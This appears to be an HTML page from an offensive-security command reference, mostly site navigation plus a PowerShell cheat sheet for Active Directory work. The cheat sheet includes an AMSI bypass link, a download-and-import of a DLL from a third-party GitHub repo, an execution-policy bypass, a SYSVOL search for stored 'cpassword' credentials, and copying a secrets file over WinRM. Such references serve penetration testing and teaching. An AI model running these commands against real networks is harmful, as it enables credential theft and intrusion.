+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mkpasswd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mkpasswd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/modprobe/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Modprobe
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mount/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mount
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/mtr/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Mtr
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nc/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nc
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ncdu/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ncdu
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/netplan/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netplan
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/netstat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netstat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/network-manager/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Network-manager
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nm%20connection%20editor/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nm Connection Manager
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nmcli/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nmcli
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/nslookup/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nslookup
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ntp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ntp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/passwd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Passwd
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/pdbedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Pdbedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ps/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ps
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/rev/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Rev
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/scp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Scp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/script/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Script
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sed/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sed
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sha1sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha1sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sha256sum/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sha256sum
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/shuf/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Shuf
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sort/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sort
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/split/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Split
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/ss/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ss
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/strings/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Strings
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sudo/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sudo
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/sudoedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Sudoedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/systemctl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Systemctl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tail/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tail
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tar/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tar
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tee/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tee
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tftp/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tftp
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/timedatectl/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Timedatectl
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/touch/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Touch
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/tr/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Tr
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/uname/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Uname
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/upower/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Upower
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/vimdiff/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Vimdiff
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/watch/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Watch
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/wc/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Wc
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/wget/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Wget
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/xargs/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Xargs
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Unix%20Commands/xxd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Xxd
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class=" active 
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#windows-commands-collapse" aria-expanded="false">
+                    Windows Commands
+                </a>
+                <div class="collapse" id="windows-commands-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../azureAD/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            AzureAD
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../cmd/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            CMD - Command Prompt
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../godmode/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            GodMode
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../ipconfig/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Ipconfig
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../nbtstat/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nbtstat
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../net%20group/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net Group
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../net%20user/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net User
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../net%20view/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Net View
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../netsh/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Netsh
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../nltest/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nltest
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../nslookup/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Nslookup
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="./"
+            class=" active 
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Powershell
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../regedit/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Regedit
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../route/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Route
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../schtasks/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Schtasks
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+        </ul>
+        <!-- endblock -->
+    </div>
+</nav>
+        <!-- endblock -->
+
+        <nav class="divider drac-bg-purple-cyan"></nav>
+
+        <div class="content">
+            <!-- block header -->
+                <header>
+    <nav class="navbar navbar-expand-xl drac-bg-purple">
+        <div class="container-fluid">
+            
+            <button class="navbar-toggler w-100 text-center" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
+                aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
+                <ul class="navbar-nav text-md-center">
+
+                    <!-- block preview -->
+                    <li class="nav-item">
+                            
+        <div class="container">
+            <div class="row row-preview">
+                <div class="col">
+                    <a href="../nslookup/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </div>
+                <div class="col">
+                    <a href="../regedit/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover" style="padding-left: 3%;">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block search -->
+                    <li class="nav-item"><div role="search" class="search-box">
+	<form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+		<input type="text" name="q" class="drac-input drac-input-search drac-input-white drac-text-white drac-bg-black-secondary"
+		placeholder="Search docs" title="Type search term here" />
+	</form>
+</div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block source -->
+                    <li class="nav-item">
+                        
+                    </li>
+                    <!--  endblock -->
+
+                </ul>
+            </div>
+
+        </div>
+    </nav>
+</header>
+            <!-- endblock -->
+
+            <!-- block content -->
+                <section class="p-md-5 section-content">
+    <article>
+        <p><h1 id="powershell">Powershell</h1>
+<p>Command-line shell and scripting language in Windows used for task automation, configuration management, and system administration tasks.</p>
+<h2 id="files">Files</h2>
+<ul>
+<li><a download="powershell.exe" href="../../assets/files/powershell.exe">powershell.exe</a></li>
+<li><a download="powershell_ise.exe" href="../../assets/files/powershell_ise.exe">powershell_ise.exe</a></li>
+</ul>
+<h2 id="antimalware-scan-interface-amsi-bypass-generator">Antimalware Scan Interface (AMSI) Bypass Generator</h2>
+<ul>
+<li><a href="https://amsi.fail/">AMSI.fail</a></li>
+</ul>
+<h2 id="active-directory-powershell-module">Active Directory PowerShell Module</h2>
+<p>This way the Active Directory PowerShell module can be used portable without administrator privileges. For example, when running in Azure Virtual Desktops or AzureAD managed devices, you will probably get the error message Unable to find a default server with Active Directory Web Services running.. Use the -Server DC01.offsec.nl flag after your CMDlet.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">mkdir</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">;</span> <span class="nb">iwr </span><span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">crypt0rr</span><span class="p">/</span><span class="n">filehosting</span><span class="p">/</span><span class="n">raw</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span> <span class="n">-OutFile</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">1234hoedjevanpapier</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">1234hoedjevanpapier</span><span class="p">.</span><span class="n">dll</span>
+</code></pre></div>
+<h5 id="powershell-module">PowerShell module</h5>
+<p><a download="Microsoft.ActiveDirectory.Management.dll" href="../assets/files/Microsoft.ActiveDirectory.Management.dll">Microsoft.ActiveDirectory.Management.dll</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">PowerShell</span><span class="p">:</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">ADModule</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">ActiveDirectory</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Verbose</span>
+</code></pre></div>
+<h2 id="examples">Examples</h2>
+<h5 id="adjust-execution-policy">Adjust execution policy</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">-scope</span> <span class="k">process</span> <span class="n">-execution</span> <span class="n">bypass</span>
+</code></pre></div>
+<h5 id="check-ms-ds-machineaccountquota">Check ‘ms-DS-MachineAccountQuota’</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Get-ADObject</span> <span class="n">-Identity</span> <span class="p">((</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">distinguishedname</span><span class="p">)</span> <span class="n">-Properties</span> <span class="n">ms-DS-MachineAccountQuota</span>
+</code></pre></div>
+<h5 id="list-users-with-store-passwords-using-reversible-encryption-enabled">List users with ‘Store passwords using reversible encryption’ enabled</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;userAccountControl -band 128&#39;</span> <span class="n">-Properties</span> <span class="n">userAccountControl</span>
+</code></pre></div>
+<h5 id="finding-cpassword">Finding cpassword</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">findstr</span> <span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">n</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">p</span> <span class="n">cpassword</span> <span class="nv">$env:logonserver</span><span class="p">\</span><span class="n">sysvol</span><span class="p">\*</span>
+</code></pre></div>
+<h5 id="get-members-of-specific-group">Get members of specific group</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Get-ADGroupMember</span> <span class="err">“</span><span class="n">Domain</span> <span class="n">Admins</span><span class="err">”</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">Get-ADGroupMember</span> <span class="err">“</span><span class="n">Domain</span> <span class="n">Admins</span><span class="err">”</span> <span class="p">|</span> <span class="nb">select </span><span class="n">SamAccountName</span>
+</code></pre></div>
+<h5 id="get-details">Get details</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nv">$env:logonserver</span>
+</code></pre></div>
+<h5 id="check-which-users-home-directories-you-have-access-to">Check which users home directories you have access to</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">gci </span><span class="n">C</span><span class="p">:\</span><span class="n">users</span><span class="p">\*\*</span>
+</code></pre></div>
+<h5 id="enable-access-to-c-drive-in-explorer">Enable access to C-drive in Explorer</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">subst</span> <span class="n">z</span><span class="p">:</span> <span class="n">c</span><span class="p">:\</span>
+</code></pre></div>
+<h5 id="check-how-many-computerobjects-can-be-added-by-a-user">Check how many computerobjects can be added by a user</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-ADObject</span> <span class="p">((</span><span class="nb">Get-ADDomain</span><span class="p">).</span><span class="n">distinguishedname</span><span class="p">)</span> <span class="n">-Properties</span> <span class="n">ms-DS-MachineAccountQuota</span>
+</code></pre></div>
+<h5 id="overview-domain-admins">Overview domain admins</h5>
+<p>Where ‘Password Never Expires’ is set.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Get-ADGroupMembers</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">\*</span> <span class="n">-Properties</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">DisplayName</span><span class="p">,</span><span class="n">sAMAccountName</span><span class="p">,</span><span class="n">PasswordLastSet</span><span class="p">,</span><span class="n">PasswordNeverExpires</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="p">}</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PasswordLastSet</span><span class="p">,</span> <span class="n">PasswordNeverExpires</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="nb">Where </span><span class="err">‘</span><span class="n">Password</span> <span class="n">Never</span> <span class="n">Expires</span><span class="err">’</span> <span class="n">is</span> <span class="n">NOT</span> <span class="n">set</span><span class="p">.</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="p">```</span><span class="n">powershell</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="nb">Get-NetGroupMember</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="nb">Get-NetUser</span> <span class="n">-Filter</span> <span class="p">\*</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">DisplayName</span><span class="p">,</span><span class="n">sAMAccountName</span><span class="p">,</span><span class="n">PwdLastSet</span><span class="p">,</span><span class="n">AccountExpires</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="p">}</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span><span class="n">PwdLastSet</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-AutoSize</span>
+</code></pre></div>
+<h5 id="check-secureboot-enabled">Check secureboot enabled</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Confirm-SecureBootUEFI</span>
+</code></pre></div>
+<h5 id="list-users-with-passwordneverexpires-enabled">List users with PasswordNeverExpires enabled</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">Get-ADUser</span> <span class="n">-filter</span> <span class="p">\*</span> <span class="n">-properties</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PasswordNeverExpires</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">passwordNeverExpires</span> <span class="o">-eq</span> <span class="s2">&quot;true&quot;</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">where </span><span class="p">{$\</span><span class="n">_</span><span class="p">.</span><span class="n">enabled</span> <span class="o">-eq</span> <span class="s2">&quot;true&quot;</span> <span class="p">}</span>
+</code></pre></div>
+<h5 id="list-domain-admins-where-account-is-sensitive-an-cannot-be-delegated-is-not-set">List Domain Admins where ‘Account is sensitive an cannot be delegated’ is not set</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Get-ADGroupMember</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="p">|</span> <span class="nb">Get-ADUser</span> <span class="n">-Properties</span> <span class="n">AccountNotDelegated</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="o">-not</span> <span class="p">$\</span><span class="n">_</span><span class="p">.</span><span class="n">AccountNotDelegated</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select </span><span class="n">AccountNotDelegated</span><span class="p">,</span><span class="n">Name</span><span class="p">,</span><span class="n">SamAccountName</span>
+</code></pre></div>
+<p>Import-Module ActiveDirectory</p>
+<h5 id="change-user-agent">Change user agent</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">iwr </span><span class="n">-UserAgent</span> <span class="s1">&#39;Non existing user agent in use&#39;</span>
+</code></pre></div>
+<h5 id="enable-repository-use">Enable repository use</h5>
+<p>For PowerShell 4 and higher. For 5.1 and higher you can try <strong>Register-PSRepository -default</strong> first otherwise use code below.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nb">Install-PackageProvider</span> <span class="n">-Name</span> <span class="n">NuGet</span> <span class="n">-RequiredVersion</span> <span class="n">2</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">5</span><span class="p">.</span><span class="n">208</span> <span class="n">-Force</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="nb">Register-PSRepository</span> <span class="n">-Name</span> <span class="n">PSGallery</span> <span class="n">-SourceLocation</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">powershellgallery</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">v2</span><span class="p">/</span> <span class="n">-PublishLocation</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">powershellgallery</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">v2</span><span class="p">/</span><span class="n">package</span><span class="p">/</span> <span class="n">-ScriptSourceLocation</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">powershellgallery</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">v2</span><span class="p">/</span><span class="n">items</span><span class="p">/</span><span class="n">psscript</span><span class="p">/</span> <span class="n">-ScriptPublishLocation</span> <span class="n">https</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">powershellgallery</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">api</span><span class="p">/</span><span class="n">v2</span><span class="p">/</span><span class="n">package</span><span class="p">/</span> <span class="n">-InstallationPolicy</span> <span class="n">Trusted</span> <span class="n">-PackageManagementProvider</span> <span class="n">NuGet</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="nb">Install-Module</span> <span class="nv">$ModuleName</span> <span class="n">-scope</span> <span class="n">CurrentUser</span>
+</code></pre></div>
+<h5 id="copy-remote-file-to-local-winrm">Copy remote file to local (WinRM)</h5>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nv">$ses</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DC01</span> <span class="n">-Credentials</span> <span class="p">$(</span><span class="nb">Get-Credential</span><span class="p">)</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="nb">Copy-Item</span> <span class="n">-FromSession</span> <span class="nv">$ses</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">adm-johndo</span><span class="p">\</span><span class="n">DC01</span><span class="p">\</span><span class="n">secrets</span><span class="p">.</span><span class="n">txt</span> <span class="n">Z</span><span class="p">:\</span><span class="n">localdisk</span><span class="p">\</span><span class="n">secrets</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<h5 id="open-relay">Open Relay</h5>
